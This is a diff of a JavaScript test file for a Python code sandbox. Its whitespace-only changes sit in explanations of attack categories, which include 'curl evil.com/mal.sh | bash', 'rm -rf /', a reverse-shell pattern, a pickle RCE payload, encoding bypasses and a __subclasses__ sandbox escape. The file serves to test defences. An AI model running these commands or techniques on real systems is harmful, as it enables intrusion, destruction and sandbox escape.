@@ -1,9 +1,9 @@
 /**
  * Python Security Attack Vectors
- * 
+ *
  * Python is commonly used for scripting and has powerful system access capabilities.
  * These tests verify blocking of dangerous operations in Python code.
- * 
+ *
  * Each test includes:
  * - name: Test identifier
  * - code: The malicious code attempt
@@ -23,17 +23,17 @@ export const pythonTests = [
     category: 'command_execution',
     explanation: `
       🎯 ATTACK: Direct Shell Command Execution
-      
+
       How hackers use this:
       os.system() passes a command to the shell for execution.
       It's the simplest way to run arbitrary commands in Python.
-      
+
       Real-world impact:
       - Execute any shell command with server privileges
       - Download and run malware: os.system('curl evil.com/mal.sh | bash')
       - Delete files: os.system('rm -rf /')
       - Modify system configuration
-      
+
       Historical note:
       This is one of the most common Python RCE vectors, found in
       countless CVEs and security incidents.
@@ -46,11 +46,11 @@ export const pythonTests = [
     category: 'command_execution',
     explanation: `
       🎯 ATTACK: Command Execution with Output Capture
-      
+
       How hackers use this:
       os.popen() runs a command and returns its output as a file object.
       Attackers use this to capture command results for exfiltration.
-      
+
       Real-world impact:
       - Run 'cat /etc/passwd' and capture the output
       - List directories to find valuable files
@@ -64,11 +64,11 @@ export const pythonTests = [
     category: 'command_execution',
     explanation: `
       🎯 ATTACK: Process Replacement via exec Family
-      
+
       How hackers use this:
       os.exec* functions replace the current process with a new one.
       This is useful for running binaries directly without shell.
-      
+
       Real-world impact:
       - Replace Python process with shell
       - Execute binaries without shell overhead
@@ -82,11 +82,11 @@ export const pythonTests = [
     category: 'command_execution',
     explanation: `
       🎯 ATTACK: Process Spawning
-      
+
       How hackers use this:
       os.spawn* functions create new processes to execute programs.
       They offer more control than system() and popen().
-      
+
       Real-world impact:
       - Spawn persistent processes (backdoors)
       - Execute binaries with specific arguments
@@ -100,11 +100,11 @@ export const pythonTests = [
     category: 'command_execution',
     explanation: `
       🎯 ATTACK: Modern Subprocess Execution
-      
+
       How hackers use this:
       subprocess is the recommended way to spawn processes in modern Python.
       It provides full control over stdin/stdout/stderr.
-      
+
       Real-world impact:
       - Execute any system command
       - Capture and process output
@@ -119,16 +119,16 @@ export const pythonTests = [
     category: 'command_execution',
     explanation: `
       🎯 ATTACK: Interactive Process Control
-      
+
       How hackers use this:
       Popen provides low-level process control with pipes for communication.
       The shell=True parameter enables shell command interpretation.
-      
+
       Real-world impact:
       - Create interactive shells
       - Pipe data between processes
       - Long-running backdoor processes
-      
+
       Security note:
       shell=True is especially dangerous as it enables shell metacharacters
     `,
@@ -140,11 +140,11 @@ export const pythonTests = [
     category: 'command_execution',
     explanation: `
       🎯 ATTACK: Simple Command Call
-      
+
       How hackers use this:
       subprocess.call() is a simplified interface for running commands.
       Returns the exit code of the executed command.
-      
+
       Real-world impact:
       - Quick command execution
       - Check if commands succeed
@@ -158,11 +158,11 @@ export const pythonTests = [
     category: 'command_execution',
     explanation: `
       🎯 ATTACK: Command Output Capture
-      
+
       How hackers use this:
       check_output() runs a command and returns its output as bytes.
       Raises an exception if the command fails.
-      
+
       Real-world impact:
       - Reliable output capture for data theft
       - Error handling built-in
@@ -176,11 +176,11 @@ export const pythonTests = [
     category: 'command_execution',
     explanation: `
       🎯 ATTACK: Legacy Command Execution
-      
+
       How hackers use this:
       The commands module is deprecated but may exist in older systems.
       Attackers try multiple methods to increase success chances.
-      
+
       Real-world impact:
       - Works on older Python 2.x systems
       - Part of comprehensive attack toolkit
@@ -198,16 +198,16 @@ export const pythonTests = [
     category: 'code_injection',
     explanation: `
       🎯 ATTACK: Dynamic Code Execution via exec()
-      
+
       How hackers use this:
       exec() executes arbitrary Python code from a string.
       Combined with obfuscation, it's a powerful attack vector.
-      
+
       Real-world impact:
       - Execute obfuscated malicious code
       - Bypass static analysis
       - Multi-stage attacks (exec downloads and runs payload)
-      
+
       Common pattern:
       exec(base64.decode(obfuscated_payload))
     `,
@@ -219,11 +219,11 @@ export const pythonTests = [
     category: 'code_injection',
     explanation: `
       🎯 ATTACK: Expression Evaluation with __import__
-      
+
       How hackers use this:
       eval() evaluates a Python expression. Combined with __import__(),
       it can import modules and call their functions.
-      
+
       Real-world impact:
       - Single-expression RCE
       - Often found in template injection vulnerabilities
@@ -237,11 +237,11 @@ export const pythonTests = [
     category: 'code_injection',
     explanation: `
       🎯 ATTACK: Compile and Execute Code
-      
+
       How hackers use this:
       compile() creates code objects that can be executed later.
       This separates code creation from execution, evading some filters.
-      
+
       Real-world impact:
       - Two-stage code execution
       - Code object inspection/modification
@@ -255,11 +255,11 @@ export const pythonTests = [
     category: 'code_injection',
     explanation: `
       🎯 ATTACK: Dynamic Module Import
-      
+
       How hackers use this:
       __import__() is the built-in function behind the import statement.
       It allows dynamic, runtime module loading.
-      
+
       Real-world impact:
       - Import dangerous modules dynamically
       - Bypass import statement blocking
@@ -273,11 +273,11 @@ export const pythonTests = [
     category: 'code_injection',
     explanation: `
       🎯 ATTACK: Import Library Module Loading
-      
+
       How hackers use this:
       importlib provides programmatic import control.
       import_module() can load any module by name.
-      
+
       Real-world impact:
       - Alternative to __import__()
       - More powerful module manipulation
@@ -354,11 +354,11 @@ export const pythonTests = [
     category: 'file_system',
     explanation: `
       🎯 ATTACK: File System Reconnaissance
-      
+
       How hackers use this:
       os.path functions reveal information about the file system
       without directly reading files.
-      
+
       Real-world impact:
       - Check if sensitive files exist
       - Map directory structure
@@ -373,11 +373,11 @@ export const pythonTests = [
     category: 'file_system',
     explanation: `
       🎯 ATTACK: Directory Listing
-      
+
       How hackers use this:
       os.listdir() reveals directory contents, helping attackers
       understand the system and find targets.
-      
+
       Real-world impact:
       - Enumerate files in sensitive directories
       - Find configuration files
@@ -392,11 +392,11 @@ export const pythonTests = [
     category: 'file_system',
     explanation: `
       🎯 ATTACK: Modern Path Library File Access
-      
+
       How hackers use this:
       pathlib is the modern, object-oriented path library.
       read_text() and read_bytes() provide easy file access.
-      
+
       Real-world impact:
       - Same as open(), different API
       - May bypass filters only checking 'open'
@@ -410,11 +410,11 @@ export const pythonTests = [
     category: 'file_system',
     explanation: `
       🎯 ATTACK: File Copy/Move Operations
-      
+
       How hackers use this:
       shutil provides high-level file operations like copy, move,
       and recursive directory operations.
-      
+
       Real-world impact:
       - Copy sensitive files to accessible locations
       - Move files to disrupt applications
@@ -428,11 +428,11 @@ export const pythonTests = [
     category: 'file_system',
     explanation: `
       🎯 ATTACK: File Input Iterator
-      
+
       How hackers use this:
       fileinput module iterates over files, often overlooked
       in security filters.
-      
+
       Real-world impact:
       - Alternative file reading method
       - Process multiple files at once
@@ -446,11 +446,11 @@ export const pythonTests = [
     category: 'file_system',
     explanation: `
       🎯 ATTACK: IO Module File Access
-      
+
       How hackers use this:
       io.open() is the same as built-in open() but explicitly
       from the io module. May bypass naive filters.
-      
+
       Real-world impact:
       - Alternative to open()
       - Binary and text mode support
@@ -468,16 +468,16 @@ export const pythonTests = [
     category: 'network',
     explanation: `
       🎯 ATTACK: Raw Socket Connection (Reverse Shell)
-      
+
       How hackers use this:
       socket module enables raw network connections. The most common
       use is creating reverse shells.
-      
+
       Real-world impact:
       - Reverse shell: socket connects to attacker, sends shell I/O
       - Data exfiltration over custom protocols
       - Port scanning and network reconnaissance
-      
+
       Classic pattern:
       socket.connect(attacker) → os.dup2(socket, stdin/stdout) → exec('/bin/sh')
     `,
@@ -489,11 +489,11 @@ export const pythonTests = [
     category: 'network',
     explanation: `
       🎯 ATTACK: HTTP Data Exfiltration
-      
+
       How hackers use this:
       urllib provides HTTP client functionality for fetching URLs
       or sending data to external servers.
-      
+
       Real-world impact:
       - Download malware payloads
       - Exfiltrate stolen data via HTTP
@@ -508,11 +508,11 @@ export const pythonTests = [
     category: 'network',
     explanation: `
       🎯 ATTACK: Low-Level HTTP Client
-      
+
       How hackers use this:
       http.client provides fine-grained HTTP control.
       Useful for crafted requests and custom protocols.
-      
+
       Real-world impact:
       - Send custom HTTP requests
       - Exfiltrate data in HTTP headers
@@ -526,11 +526,11 @@ export const pythonTests = [
     category: 'network',
     explanation: `
       🎯 ATTACK: FTP File Transfer
-      
+
       How hackers use this:
       FTP can be used to upload stolen files or download
       malware from attacker servers.
-      
+
       Real-world impact:
       - Exfiltrate files via FTP
       - Download additional tools
@@ -544,11 +544,11 @@ export const pythonTests = [
     category: 'network',
     explanation: `
       🎯 ATTACK: Email-Based Exfiltration
-      
+
       How hackers use this:
       smtplib can send emails containing stolen data.
       Email often bypasses network monitoring.
-      
+
       Real-world impact:
       - Email credentials and secrets to attacker
       - Use server as spam relay
@@ -562,11 +562,11 @@ export const pythonTests = [
     category: 'network',
     explanation: `
       🎯 ATTACK: HTTP Requests Library
-      
+
       How hackers use this:
       requests is the most popular HTTP library in Python.
       Simple API for exfiltrating data.
-      
+
       Real-world impact:
       - JSON payload exfiltration
       - Easy API interaction
@@ -584,11 +584,11 @@ export const pythonTests = [
     category: 'system_access',
     explanation: `
       🎯 ATTACK: Environment Variable Theft
-      
+
       How hackers use this:
       os.environ contains all environment variables, often including
       sensitive configuration and credentials.
-      
+
       Real-world impact:
       - Steal API keys (AWS_SECRET_ACCESS_KEY, etc.)
       - Get database passwords
@@ -603,11 +603,11 @@ export const pythonTests = [
     category: 'system_access',
     explanation: `
       🎯 ATTACK: Path Information Disclosure
-      
+
       How hackers use this:
       Knowing the working directory helps attackers understand
       the application structure and plan further attacks.
-      
+
       Real-world impact:
       - Reveal server paths
       - Aid in path traversal attacks
@@ -621,11 +621,11 @@ export const pythonTests = [
     category: 'system_access',
     explanation: `
       🎯 ATTACK: System Fingerprinting
-      
+
       How hackers use this:
       platform module reveals OS details useful for
       selecting targeted exploits.
-      
+
       Real-world impact:
       - Identify OS for targeted attacks
       - Find kernel version for exploits
@@ -756,11 +756,11 @@ with open('notes.txt') as handle:
     category: 'system_access',
     explanation: `
       🎯 ATTACK: User Information Gathering
-      
+
       How hackers use this:
       getpass reveals the current user, useful for targeted
       attacks and privilege enumeration.
-      
+
       Real-world impact:
       - Identify running user
       - Target specific user directories
@@ -774,11 +774,11 @@ with open('notes.txt') as handle:
     category: 'system_access',
     explanation: `
       🎯 ATTACK: Native Code Loading
-      
+
       How hackers use this:
       ctypes allows loading shared libraries and calling C functions,
       bypassing Python's safety mechanisms.
-      
+
       Real-world impact:
       - Load malicious shared libraries
       - Call system functions directly
@@ -793,11 +793,11 @@ with open('notes.txt') as handle:
     category: 'system_access',
     explanation: `
       🎯 ATTACK: Process Spawning for Persistence
-      
+
       How hackers use this:
       multiprocessing creates child processes that survive
       parent termination.
-      
+
       Real-world impact:
       - Spawn persistent backdoors
       - Fork bomb for DoS
@@ -811,11 +811,11 @@ with open('notes.txt') as handle:
     category: 'system_access',
     explanation: `
       🎯 ATTACK: Background Thread Execution
-      
+
       How hackers use this:
       Threads run concurrently, potentially executing malicious
       code in the background.
-      
+
       Real-world impact:
       - Background malware execution
       - Evade single-threaded monitoring
@@ -833,16 +833,16 @@ with open('notes.txt') as handle:
     category: 'deserialization',
     explanation: `
       🎯 ATTACK: Pickle Deserialization RCE
-      
+
       How hackers use this:
       pickle can execute arbitrary code during deserialization.
       Malicious pickle payloads achieve RCE when unpickled.
-      
+
       Real-world impact:
       - Classic Python deserialization vulnerability
       - The payload shown executes os.system('id')
       - Common in web apps accepting pickled data
-      
+
       Warning:
       NEVER unpickle data from untrusted sources!
     `,
@@ -854,11 +854,11 @@ with open('notes.txt') as handle:
     category: 'deserialization',
     explanation: `
       🎯 ATTACK: Marshal Code Object Loading
-      
+
       How hackers use this:
       marshal deserializes Python code objects.
       Can load malicious compiled Python bytecode.
-      
+
       Real-world impact:
       - Load pre-compiled malicious code
       - Bypass source code analysis
@@ -872,11 +872,11 @@ with open('notes.txt') as handle:
     category: 'deserialization',
     explanation: `
       🎯 ATTACK: Shelve Persistent Objects
-      
+
       How hackers use this:
       shelve uses pickle internally, inheriting its vulnerabilities.
       Creates persistent storage that could contain malicious objects.
-      
+
       Real-world impact:
       - Persistent pickle storage
       - Same RCE risks as pickle
@@ -894,11 +894,11 @@ with open('notes.txt') as handle:
     category: 'encoding_bypass',
     explanation: `
       🎯 ATTACK: Base64 Encoded Payload
-      
+
       How hackers use this:
       Base64 encoding hides malicious code from simple filters.
       The encoded string decodes to: import os; os.system('id')
-      
+
       Real-world impact:
       - Bypass pattern-based filters
       - Hide payload in seemingly random strings
@@ -912,11 +912,11 @@ with open('notes.txt') as handle:
     category: 'encoding_bypass',
     explanation: `
       🎯 ATTACK: Character Code Obfuscation
-      
+
       How hackers use this:
       Building strings from chr() codes hides keywords from filters.
       chr(105),chr(109)... spells 'import'.
-      
+
       Real-world impact:
       - Bypass keyword filters
       - Each character as a number
@@ -930,11 +930,11 @@ with open('notes.txt') as handle:
     category: 'encoding_bypass',
     explanation: `
       🎯 ATTACK: Hex Encoded Payload
-      
+
       How hackers use this:
       Hex encoding is an alternative to base64 for hiding code.
       '696d706f7274206f73' = 'import os'
-      
+
       Real-world impact:
       - Alternative to base64
       - Bypasses base64-specific filters
@@ -948,11 +948,11 @@ with open('notes.txt') as handle:
     category: 'encoding_bypass',
     explanation: `
       🎯 ATTACK: ROT13/Codec Obfuscation
-      
+
       How hackers use this:
       codecs module supports various encodings including rot_13.
       'vzcbeg bf' in rot_13 is 'import os'.
-      
+
       Real-world impact:
       - Multiple encoding options
       - rot_13 is simple letter substitution
@@ -966,11 +966,11 @@ with open('notes.txt') as handle:
     category: 'encoding_bypass',
     explanation: `
       🎯 ATTACK: Compressed Payload
-      
+
       How hackers use this:
       Compression hides code and reduces payload size.
       The compressed data decompresses to malicious code.
-      
+
       Real-world impact:
       - Smaller payload for injection
       - Harder to detect patterns
@@ -988,11 +988,11 @@ with open('notes.txt') as handle:
     category: 'introspection',
     explanation: `
       🎯 ATTACK: Global Namespace Access
-      
+
       How hackers use this:
       globals() returns the global symbol table, exposing imported
       modules and functions.
-      
+
       Real-world impact:
       - Discover available modules
       - Access __builtins__ for dangerous functions
@@ -1006,11 +1006,11 @@ with open('notes.txt') as handle:
     category: 'introspection',
     explanation: `
       🎯 ATTACK: Local Namespace Access
-      
+
       How hackers use this:
       locals() exposes local variables which might contain
       sensitive data or useful references.
-      
+
       Real-world impact:
       - Find variables with secrets
       - Discover local module imports
@@ -1024,11 +1024,11 @@ with open('notes.txt') as handle:
     category: 'introspection',
     explanation: `
       🎯 ATTACK: Variable Dictionary Access
-      
+
       How hackers use this:
       vars() returns __dict__ of an object or local namespace.
       Exposes internal object state.
-      
+
       Real-world impact:
       - Access object internals
       - Modify private attributes
@@ -1042,11 +1042,11 @@ with open('notes.txt') as handle:
     category: 'introspection',
     explanation: `
       🎯 ATTACK: Attribute Enumeration
-      
+
       How hackers use this:
       dir() lists all attributes of an object.
       Used to discover available functions and methods.
-      
+
       Real-world impact:
       - Enumerate available functions
       - Find undocumented capabilities
@@ -1060,11 +1060,11 @@ with open('notes.txt') as handle:
     category: 'introspection',
     explanation: `
       🎯 ATTACK: Dynamic Attribute Access
-      
+
       How hackers use this:
       getattr() retrieves attributes by name, enabling dynamic
       access to dangerous functions.
-      
+
       Real-world impact:
       - Access blocked attributes dynamically
       - Bypass direct attribute blocking
@@ -1078,16 +1078,16 @@ with open('notes.txt') as handle:
     category: 'introspection',
     explanation: `
       🎯 ATTACK: Class Hierarchy Traversal
-      
+
       How hackers use this:
       __subclasses__() returns all subclasses of a class.
       Used to find classes with dangerous capabilities.
-      
+
       Real-world impact:
       - Find classes with file access (like FileLoader)
       - Locate classes with code execution methods
       - Classic Python sandbox escape
-      
+
       Common pattern:
       tuple.__mro__[1].__subclasses__() → find os._wrap_close → access os
     `,
@@ -1099,11 +1099,11 @@ with open('notes.txt') as handle:
     category: 'introspection',
     explanation: `
       🎯 ATTACK: Method Resolution Order Traversal
-      
+
       How hackers use this:
       __mro__ shows the inheritance chain. Combined with __subclasses__,
       it enables traversing the entire class hierarchy.
-      
+
       Real-world impact:
       - Navigate to object base class
       - Find all classes in the system
@@ -1117,11 +1117,11 @@ with open('notes.txt') as handle:
     category: 'introspection',
     explanation: `
       🎯 ATTACK: Builtins Module Access
-      
+
       How hackers use this:
       __builtins__ contains all built-in functions including
       dangerous ones like __import__, eval, exec.
-      
+
       Real-world impact:
       - Access dangerous built-in functions
       - Even if direct names are blocked
@@ -1139,11 +1139,11 @@ with open('notes.txt') as handle:
     category: 'code_manipulation',
     explanation: `
       🎯 ATTACK: AST Manipulation
-      
+
       How hackers use this:
       ast module parses Python code into abstract syntax trees.
       Can be used to generate or modify code dynamically.
-      
+
       Real-world impact:
       - Generate malicious code programmatically
       - Modify legitimate code at runtime
@@ -1157,11 +1157,11 @@ with open('notes.txt') as handle:
     category: 'code_manipulation',
     explanation: `
       🎯 ATTACK: Bytecode Disassembly
-      
+
       How hackers use this:
       dis module shows Python bytecode. Useful for understanding
       how security measures work to bypass them.
-      
+
       Real-world impact:
       - Reverse engineer security code
       - Understand bytecode for manipulation
@@ -1175,11 +1175,11 @@ with open('notes.txt') as handle:
     category: 'code_manipulation',
     explanation: `
       🎯 ATTACK: Code Object Creation
-      
+
       How hackers use this:
       CodeType creates raw code objects from components.
       Can craft malicious bytecode directly.
-      
+
       Real-world impact:
       - Create executable code objects
       - Bypass source code analysis
@@ -1197,11 +1197,11 @@ with open('notes.txt') as handle:
     category: 'signal_handling',
     explanation: `
       🎯 ATTACK: Signal Handler Code Execution
-      
+
       How hackers use this:
       Signal handlers execute when signals are received.
       Malicious handlers can trigger on process events.
-      
+
       Real-world impact:
       - Execute code on termination
       - Persistence through signal handling
@@ -1215,11 +1215,11 @@ with open('notes.txt') as handle:
     category: 'signal_handling',
     explanation: `
       🎯 ATTACK: Exit Handler Registration
-      
+
       How hackers use this:
       atexit registers functions to run at program exit.
       Malicious exit handlers persist until shutdown.
-      
+
       Real-world impact:
       - Execute code at termination
       - Guaranteed execution even on errors
@@ -1238,7 +1238,7 @@ with open('notes.txt') as handle:
     category: 'safe_code',
     explanation: `
       ✅ SAFE: Basic Output
-      
+
       This is legitimate code that should execute:
       print() is fundamental for learning Python and
       debugging code. Completely safe.
@@ -1252,7 +1252,7 @@ with open('notes.txt') as handle:
     category: 'safe_code',
     explanation: `
       ✅ SAFE: Mathematical Operations
-      
+
       This is legitimate code that should execute:
       Basic arithmetic is essential for any programming.
     `,
@@ -1265,7 +1265,7 @@ with open('notes.txt') as handle:
     category: 'safe_code',
     explanation: `
       ✅ SAFE: List Comprehension
-      
+
       This is legitimate code that should execute:
       List comprehensions are Pythonic and commonly
       taught in introductory courses.
@@ -1284,7 +1284,7 @@ print(p.x + p.y)`,
     category: 'safe_code',
     explanation: `
       ✅ SAFE: Object-Oriented Programming
-      
+
       This is legitimate code that should execute:
       Class definitions and object creation are
       fundamental to Python development.
@@ -1298,7 +1298,7 @@ print(p.x + p.y)`,
     category: 'safe_code',
     explanation: `
       ✅ SAFE: Lambda Functions
-      
+
       This is legitimate code that should execute:
       Lambda expressions are useful for simple
       anonymous functions.
